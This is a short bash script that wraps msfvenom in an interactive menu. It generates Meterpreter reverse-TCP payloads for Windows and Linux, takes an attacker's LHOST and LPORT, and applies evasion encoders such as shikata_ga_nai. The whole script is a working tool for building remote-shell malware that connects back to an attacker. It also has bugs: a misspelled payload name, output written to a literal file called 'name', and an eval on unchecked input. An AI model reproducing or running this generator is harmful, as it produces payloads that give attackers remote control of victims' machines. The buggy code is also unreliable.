#!/bin/bash
echo ""
#data
type1="windows/x64/meterpreter/reverse_tcp"
type2="windows/x86/meterpreter/reverse_tcp"
type3="linuu/x64/meterpreter/reverse_tcp"
type4="linux/x86/meterpreter/reverse_tcp"
encoder1="x64/xor_dynamic"
encoder2="x86/shikata_ga_nai"
formats1="c"
formats2="exe"
formats3="elf"

echo "1) $type1"
echo "2) $type2"
echo "3) $type3"
echo "4) $type4"

#1.-p
echo ""
read -p "Select your payload(1-4):" p
case $p in
    1) payload=$type1
    ;;
    2) payload=$type2
    ;;
    3) payload=$type3
    ;;
    4) payload=$type4
    ;;
    *) echo "You do not select a number between 1 to 4"
    ;;
esac

#2.LHOST
echo ""
read -p "Input your LHOST: " lhost

#3.LPORT
echo ""
read -p "Input your LPORT: " lport

#4.Encoder
echo ""
echo "1) $encoder1"
echo "2) $encoder2"
echo ""
read -p "Select your encoder(default:none): " e
case $e in
    1) encoder="-e $encoder1"
    ;;
    2) encoder="-e $encoder2"
    ;;
    3) echo ""
esac

#5.Formats
echo ""
echo "1) $formats1"
echo "2) $formats2"
echo "3) $formats3"
echo ""
read -p "Select your formats(default:c): " f
case $f in
    1) formats="$formats1"
    ;;
    2) formats="$formats2"
    ;;
    3) formats="$formats3"
    ;;
    *) formats="$formats1"
esac

#6.Filename
echo ""
read -p "Input your filename: " name

eval "msfvenom -p $payload LHOST=$lhost LPORT=$lport $encoder -f $formats > name"
